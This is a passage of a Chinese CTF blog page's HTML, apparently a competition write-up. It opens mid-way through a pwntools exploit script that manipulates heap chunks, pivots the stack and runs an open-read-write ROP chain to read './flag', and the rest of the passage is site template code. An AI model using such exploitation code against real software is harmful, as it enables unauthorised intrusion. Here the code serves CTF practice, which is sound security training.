class="number">3</span></span><br><span class="line">pl+= p64(leave) <span class="comment">#call</span></span><br><span class="line">pl+= p64(rdi)</span><br><span class="line">pl+= p64(<span class="number">0</span>)</span><br><span class="line">pl+= p64(rsi)</span><br><span class="line">pl+= p64(heap-<span class="number">0x100</span>)</span><br><span class="line">pl+= p64(rax)</span><br><span class="line">pl+= p64(<span class="number">0</span>)</span><br><span class="line">pl+= p64(syscall)</span><br><span class="line">pl+= p64(rsp)</span><br><span class="line">pl+= p64(heap-<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># stack mig</span></span><br><span class="line">add_b(<span class="string">&#x27;a&#x27;</span>) <span class="comment">#8</span></span><br><span class="line">edit(<span class="number">8</span>, pl)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">pl = p64(rsi)</span><br><span class="line">pl+= p64(heap+<span class="number">0x200</span>)</span><br><span class="line">pl = p64(rdx)</span><br><span class="line">pl+= p64(<span class="number">0x200</span>)</span><br><span class="line">pl+= p64(<span class="number">0</span>)</span><br><span class="line">pl+= p64(read)</span><br><span class="line"><span class="comment"># pl+= p64(rsp)</span></span><br><span class="line"><span class="comment"># pl+= p64(heap+0x200-0x20)</span></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(pl)</span><br><span class="line">p.interactive()</span><br><span class="line">pl = <span class="string">&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">pl+= p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">pl+= p64(rdi)</span><br><span class="line">pl+= p64(heap-<span class="number">0x100</span>)</span><br><span class="line">pl+= p64(rsi)</span><br><span class="line">pl+= p64(<span class="number">0</span>)</span><br><span class="line">pl+= p64(rax)</span><br><span class="line">pl+= p64(<span class="number">2</span>)</span><br><span class="line">pl+= p64(syscall)</span><br><span class="line">pl+= p64(rdi)</span><br><span class="line">pl+= p64(<span class="number">3</span>)</span><br><span class="line">pl+= p64(rsi)</span><br><span class="line">pl+= p64(heap-<span class="number">0x100</span>)</span><br><span class="line">pl+= p64(rdx)</span><br><span class="line">pl+= p64(<span class="number">0x50</span>)</span><br><span class="line">pl+= p64(<span class="number">0</span>)</span><br><span class="line">pl+= p64(read)</span><br><span class="line">pl+= p64(rdi)</span><br><span class="line">pl+= p64(<span class="number">1</span>)</span><br><span class="line">pl+= p64(rsi)</span><br><span class="line">pl+= p64(heap-<span class="number">0x100</span>)</span><br><span class="line">pl+= p64(rdx)</span><br><span class="line">pl+= p64(<span class="number">0x50</span>)</span><br><span class="line">pl+= p64(<span class="number">0</span>)</span><br><span class="line">pl+= p64(write)</span><br><span class="line"><span class="comment">#orw</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sl(pl)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">shell()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://hgreed.vip/2022/05/24/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9B/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2022/04/10/cve-2021-4034-%E7%AE%80%E7%BA%A6%E5%88%86%E6%9E%90/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">cve-2021-4034_简约分析</div>
+      </a>
+    
+  </nav>
+
+  
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2015-2022
+        <i class="ri-heart-fill heart_icon"></i> H.greed
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="https://user-images.githubusercontent.com/72968793/136398013-abf88785-b056-4f51-aa15-a8ee261f5c7f.jpg" alt="H.greed"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://jue-xian.gitee.io/">老博客1</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://jue-xian.gitee.io/diazang">老博客2</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://www.mrskye.cn/">skye231</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://blackwatch219.github.io/">Blackwatch</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://zoeyctf.top">zoey</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://eeknight.top">eeknight</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://www.mrzry.top">mrzry</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://h3h3qaq.github.io/">H3h3QAQ</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://ctfking.com/">tajang</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://d0gekong.github.io/">驹宝宝</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://reigniting.github.io/">党姐</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://syunaht.com/">巡璃</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://www.xiinnn.com/">lxxx</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+ <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true,
+  };
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+ 
+<script src="/js/clickLove.js"></script>
+ 
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="86"
+        src="//music.163.com/outchain/player?type=2&id=1878868202&auto=0&height=66"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+    
+
+  </div>
+</body>
+
+</html>
